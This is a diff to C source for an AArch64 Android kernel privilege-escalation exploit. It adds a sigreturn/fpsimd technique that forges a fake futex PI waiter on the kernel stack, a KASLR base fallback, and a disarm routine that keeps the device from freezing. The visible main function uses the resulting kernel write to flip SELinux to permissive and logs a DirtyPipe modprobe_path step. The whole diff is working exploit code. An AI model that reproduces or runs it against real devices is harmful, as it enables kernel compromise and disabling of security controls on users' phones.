@@ -44,6 +44,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include <ucontext.h>
 
 #include "common.h"
 
@@ -126,7 +127,6 @@ static unsigned long k_resolve(const char *name)
     return 0;
 }
 
-/*============================================================================*/
 /*  SECTION 4 : FUTEX CONSTANTS + RAW AARCH64 SYSCALLS                        */
 /*============================================================================*/
 
@@ -206,6 +206,8 @@ static atomic_int x_blocking  = 0;
 static atomic_int       y_done       = 0;
 static atomic_int       y_tid = 0;
 static atomic_int       x_tid = 0;
+static atomic_int       y_cleanup    = 0;
+static atomic_int       x_done       = 0;
 
 static unsigned long y_pol = SCHED_NORMAL;
 static long trigger_adj_pi(pid_t tid)
@@ -226,6 +228,81 @@ static volatile int respray_done = 0;
 static unsigned long respray_parent_color = 0;
 static unsigned long respray_value = 0;
 static int fake_lock2_idx = 0;
+
+/* Sigreturn writer (TRIGGER=sigreturn): writes fake waiter into fpsimd vregs
+ * via SIGUSR2 handler, mirroring zainarbani fpsimd.c + exploit-finale port.
+ * The handler writes either the initial stamp (rb=0, task=k_ghost_task,
+ * lock=k_fake_lock) or the forge geometry (rb_parent_color=target, rb_right=value,
+ * lock=k_fake_lock2) depending on sigret_respray_flag. */
+#define SIGRETURN_FPSIMD_WAITER_OFF 0x18
+#define SIGRETURN_SVE_WAITER_OFF   0x28
+#define FAKE_WAITER_LAYOUT_SIZE    0x58
+#define FPSIMD_MAGIC 0x46508001ULL
+
+struct k_fpsimd_context {
+    uint32_t magic;
+    uint32_t size;
+    uint32_t fpsr;
+    uint32_t fpcr;
+    uint8_t  vregs[32 * 16];
+};
+
+static atomic_int sigret_respray_flag;
+static atomic_int sigret_handler_done;
+static atomic_int sigret_handler_status;
+static _Atomic uint64_t sigret_respray_pc;
+static _Atomic uint64_t sigret_respray_val;
+static _Atomic uint64_t sigret_respray_lock;
+
+static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext) {
+    (void)sig; (void)info;
+    ucontext_t *ctx = ucontext;
+    unsigned char *start = ctx->uc_mcontext.__reserved;
+    unsigned char *end = start + sizeof(ctx->uc_mcontext.__reserved);
+    unsigned char *cur = start;
+    int status = -3;
+
+    while ((size_t)(end - cur) >= 8) {
+        uint32_t m = *(const uint32_t *)cur;
+        uint32_t sz = *(const uint32_t *)(cur + 4);
+        if (m == 0 && sz == 0) break;
+        if (sz < 8 || (sz & 15) || (size_t)(end - cur) < (size_t)sz) break;
+        if (m == FPSIMD_MAGIC) {
+            struct k_fpsimd_context *fpsimd = (struct k_fpsimd_context *)cur;
+            long off = SIGRETURN_FPSIMD_WAITER_OFF;
+            unsigned char *dst = (unsigned char *)fpsimd + off;
+            uint64_t *w = (uint64_t *)dst;
+
+            if (atomic_load(&sigret_respray_flag)) {
+                w[0x00/8] = atomic_load(&sigret_respray_pc);
+                w[0x08/8] = atomic_load(&sigret_respray_val);
+                w[0x10/8] = 0;
+                w[0x30/8] = (uint64_t)k_ghost_task;
+                w[0x38/8] = atomic_load(&sigret_respray_lock);
+                for (size_t i = 0x40/8; i < FAKE_WAITER_LAYOUT_SIZE/8; i++) w[i] = 0;
+                atomic_store(&sigret_respray_flag, 0);
+            } else {
+                memset(w, 0, FAKE_WAITER_LAYOUT_SIZE);
+                w[0x30/8] = (uint64_t)k_ghost_task;
+                w[0x38/8] = (uint64_t)k_fake_lock;
+            }
+            status = 1;
+            break;
+        }
+        cur += sz;
+    }
+    atomic_store(&sigret_handler_status, status);
+    atomic_store(&sigret_handler_done, 1);
+}
+
+static void sigreturn_install_handler(void) {
+    struct sigaction sa;
+    memset(&sa, 0, sizeof(sa));
+    sa.sa_sigaction = sigreturn_handler;
+    sa.sa_flags = SA_SIGINFO | SA_RESTART;
+    sigemptyset(&sa.sa_mask);
+    sigaction(SIGUSR2, &sa, NULL);
+}
 
 void ghost_write_value(unsigned long target, unsigned long value)
 {
@@ -436,44 +513,109 @@ static void *thread_Y(void *arg)
     atomic_store(&y_parking, 1);
     r = futex_raw(&cond, FUTEX_WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);
 
-    int mcast_fd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (mcast_fd < 0) { pr_err("Y socket failed errno=%d", errno); return NULL; }
+    const char *trigger = getenv("TRIGGER");
+    if (!trigger) trigger = "mcast";
+    int use_sigreturn = (strcmp(trigger, "sigreturn") == 0);
 
-    /* MCAST stamp (the ghost-write entry primitive) */
+    if (use_sigreturn) {
+        sigreturn_install_handler();
+    }
+
+    int mcast_fd = -1;
+    if (!use_sigreturn) {
+        mcast_fd = socket(AF_INET, SOCK_DGRAM, 0);
+        if (mcast_fd < 0) { pr_err("Y socket failed errno=%d", errno); return NULL; }
+    }
+
+    /* Stamp the ghost (entry primitive). MCAST path uses setsockopt; sigreturn
+     * path uses SIGUSR2 handler writing into fpsimd vregs, rt_sigreturn reloads
+     * onto kernel stack. */
     uint64_t marker = 0x4D434153544C4F43ULL; /* "MCASTLOC" */
     if (getenv("PROBE")) {
         marker = (uint64_t)SENT(1);
         pr_debug("Y PROBE mode: marker=SENT(1)");
     }
 
-    /* Stamp waiter->lock = fake_lock so the PI walk settles the ghost into
-     * fake_lock's waiters tree, enabling the rb_erase write primitive. */
-    unsigned long stamped_lock = k_fake_lock;
-    mcast_stamp_stack(mcast_fd, stamped_lock, k_ghost_task, marker);
+    if (use_sigreturn) {
+        atomic_store(&sigret_respray_flag, 0);
+        atomic_store(&sigret_handler_done, 0);
+        atomic_store(&sigret_handler_status, 0);
+        int tid = (int)syscall(SYS_gettid);
+        syscall(SYS_tgkill, getpid(), tid, SIGUSR2);
+        while (!atomic_load(&sigret_handler_done)) sched_yield();
+        if (getenv("SIGRETURN_DEBUG_RET"))
+            pr_info("Y sigreturn initial stamp: status=%d",
+                    atomic_load(&sigret_handler_status));
+    } else {
+        unsigned long stamped_lock = k_fake_lock;
+        mcast_stamp_stack(mcast_fd, stamped_lock, k_ghost_task, marker);
+    }
+
 
     atomic_store_explicit(&y_done, 1, memory_order_release);
 
     /* Respray loop: main() sets respray_ready + respray_value/parent_color;
      * we respray from thread_Y's stack to maintain the stack-aliasing that
-     * the PI-chain walk requires. */
+     * the PI-chain walk requires. Resident loop until main asks us to disarm
+     * + exit. While resident, the ghost (forged on this stack, task=dead-end)
+     * is reachable by POCO's idle PI walks; the dead-end task makes that walk
+     * terminate instead of descending into init_task. The disarm below is what
+     * lets us exit cleanly. */
     for (;;) {
         if (respray_ready) {
             respray_ready = 0;
-            unsigned char gsr2[GROUP_SOURCE_REQ_SIZE];
-            memset(gsr2, 0, sizeof(gsr2));
-            *((uint64_t *)(gsr2 + STAMP_OFF + 0x00)) = respray_parent_color;
-            *((uint64_t *)(gsr2 + STAMP_OFF + 0x08)) = respray_value;
-            *((uint64_t *)(gsr2 + STAMP_OFF + 0x10)) = 0x0UL;
-            *((uint64_t *)(gsr2 + STAMP_OFF + 0x30)) = k_ghost_task;
-            *((uint64_t *)(gsr2 + STAMP_OFF + 0x38)) = k_fake_lock2;
-            int ret = setsockopt(mcast_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
-                                 gsr2, sizeof(gsr2));
-            if (getenv("MCAST_DEBUG_RET"))
-                pr_info("Y respray ret=%d errno=%d", ret, errno);
+            if (use_sigreturn) {
+                atomic_store(&sigret_respray_pc, respray_parent_color);
+                atomic_store(&sigret_respray_val, respray_value);
+                atomic_store(&sigret_respray_lock, k_fake_lock2);
+                atomic_store(&sigret_respray_flag, 1);
+                atomic_store(&sigret_handler_done, 0);
+                int tid = (int)syscall(SYS_gettid);
+                syscall(SYS_tgkill, getpid(), tid, SIGUSR2);
+                while (!atomic_load(&sigret_handler_done)) sched_yield();
+                if (getenv("SIGRETURN_DEBUG_RET"))
+                    pr_info("Y sigreturn respray: status=%d pc=%016llx val=%016llx",
+                            atomic_load(&sigret_handler_status),
+                            (unsigned long long)respray_parent_color,
+                            (unsigned long long)respray_value);
+            } else {
+                unsigned char gsr2[GROUP_SOURCE_REQ_SIZE];
+                memset(gsr2, 0, sizeof(gsr2));
+                *((uint64_t *)(gsr2 + STAMP_OFF + 0x00)) = respray_parent_color;
+                *((uint64_t *)(gsr2 + STAMP_OFF + 0x08)) = respray_value;
+                *((uint64_t *)(gsr2 + STAMP_OFF + 0x10)) = 0x0UL;
+                *((uint64_t *)(gsr2 + STAMP_OFF + 0x30)) = k_ghost_task;
+                *((uint64_t *)(gsr2 + STAMP_OFF + 0x38)) = k_fake_lock2;
+                int ret = setsockopt(mcast_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
+                                     gsr2, sizeof(gsr2));
+                if (getenv("MCAST_DEBUG_RET"))
+                    pr_info("Y respray ret=%d errno=%d", ret, errno);
+            }
             __atomic_store_n(&respray_done, 1, __ATOMIC_RELEASE);
         }
+        if (atomic_load_explicit(&y_cleanup, memory_order_acquire))
+            break;
         sched_yield();
     }
+
+    /* DISARM (reference selinux_permissive.c step 7): clear Y->pi_blocked_on so
+     * the forged ghost is unlinked from every walkable kernel PI tree. An
+     * instant-timeout FUTEX_LOCK_PI on a "locked-by-self" futex forces the
+     * kernel slowpath, whose remove_waiter() path sets task_Y->pi_blocked_on =
+     * NULL. Without this, the corrupted ghost stays linked and futex_exit (or
+     * POCO's idle PI walk) deadlocks the device. */
+    int dummy_pi = (int)(0x80000000U | (unsigned int)getpid());
+    struct timespec ts = { .tv_sec = 0, .tv_nsec = 0 };
+    (void)futex_raw(&dummy_pi, FUTEX_LOCK_PI_PRIVATE, 0, (long)&ts, NULL, 0);
+
+    /* Release L2 so X can wake up and clean up L1. */
+    futex_raw(&pi2, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
+
+    /* Wait for X to finish so our stack (and the disarmed ghost) is no longer
+     * referenced before we return. */
+    while (!atomic_load(&x_done))
+        sched_yield();
+    pr_debug("Y: disarmed + L2 released, exiting cleanly");
     return NULL;
 }
 
@@ -489,7 +631,13 @@ static void *thread_X(void *arg)
     atomic_store(&x_blocking, 1);
     r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
     pr_debug("X LOCK_PI(L2) returned %ld", r);
-    while (1) sched_yield();
+
+    /* Woke up (Y released L2 via disarm). Clean up both PI futexes so the
+     * topology is torn down and Y can exit. */
+    futex_raw(&pi1, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
+    futex_raw(&pi2, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
+    atomic_store_explicit(&x_done, 1, memory_order_release);
+    pr_debug("X: released L1/L2, exiting cleanly");
     return NULL;
 }
 
@@ -513,7 +661,14 @@ int main(void)
         pr_warn("tracefs KASLR leak failed; trying perf fallback");
         ks_base = perf_leak_text_base();
     }
-    if (!ks_base) { pr_err("FATAL: all KASLR leaks failed (tracefs + perf)"); return EXIT_FAILURE; }
+    if (!ks_base) {
+        const char *kb = getenv("KASLR_BASE");
+        if (kb && kb[0]) {
+            ks_base = (unsigned long)strtoul(kb, NULL, 0);
+            pr_info("KASLR: using KASLR_BASE env base=0x%lx", ks_base);
+        }
+    }
+    if (!ks_base) { pr_err("FATAL: all KASLR leaks failed (tracefs + perf + KASLR_BASE)"); return EXIT_FAILURE; }
     ks_slide = ks_base - KIMAGE_TEXT_BASE;
     kaslr_done = 1;
     kaslr_base = (uint64_t)ks_base;
@@ -590,7 +745,7 @@ int main(void)
     usleep(100000);
     pr_success("phase1: ghost settled into fake_lock=0x%lx", k_fake_lock);
 
-    /* PHASE 2: selinux permissive flip via ghost-write */
+    /* PHASE 2: selinux permissive flip */
     pr_info("=== SELINUX PERMISSIVE FLIP ===");
     long before = -1;
     {
@@ -602,10 +757,19 @@ int main(void)
     } else {
         pr_info("selinux = %ld (enforcing)", before);
         usleep(100000);
+
+        /* Step 1 (+0): write value with low byte 0x00 -> enforcing (bool @ +0) = 0.
+         * MUST be a WRITABLE kernel address: the rb_erase write primitive reads
+         * child=value as an rb node and writes child->__rb_parent_color=pc back
+         * into it. A text/rodata address (ks_base) faults here. empty_zero_page
+         * is in the writable linear map and was proven in p1c. */
         ghost_write_value(k_selinux + 0, k_empty_zero_page);
         usleep(1000);
-        ghost_write_value(k_selinux + 4, k_val2mb);
-        usleep(100000);
+
+    /* Step 2 (+4): REMOVED. On 5.15.180 this covers policycap[1..7] +
+     * android_netlink_route. Writing a kernel address here corrupts selinux
+     * runtime state and crashes inside security_compute_av. */
+
         long after = -1;
         {
             FILE *f = fopen("/sys/fs/selinux/enforce", "r");
@@ -633,7 +797,17 @@ int main(void)
         pr_err("=== DirtyPipe modprobe_path failed (ret=%d) ===", ret);
     }
 
-    pr_warn("stable test: parking forever. do not join/exit X/Y.");
+    /* DISARM + clean teardown (reference step 7). Tell Y to clear its
+     * pi_blocked_on (unlinking the ghost) and release L2; X then releases
+     * L1/L2 and signals x_done. Join both so their stacks (and the ghost)
+     * are fully unreferenced before any process exit — this is what prevents
+     * the futex_exit deadlock / POCO idle-PI-walk freeze. */
+    atomic_store_explicit(&y_cleanup, 1, memory_order_release);
+    pthread_join(ty, NULL);
+    pthread_join(tx, NULL);
+    pr_success("=== ghost disarmed, threads joined; selinux permissive persists ===");
+
+    pr_warn("stable test: parking forever.");
     for (;;) sleep(3600);
     return ret;
 }
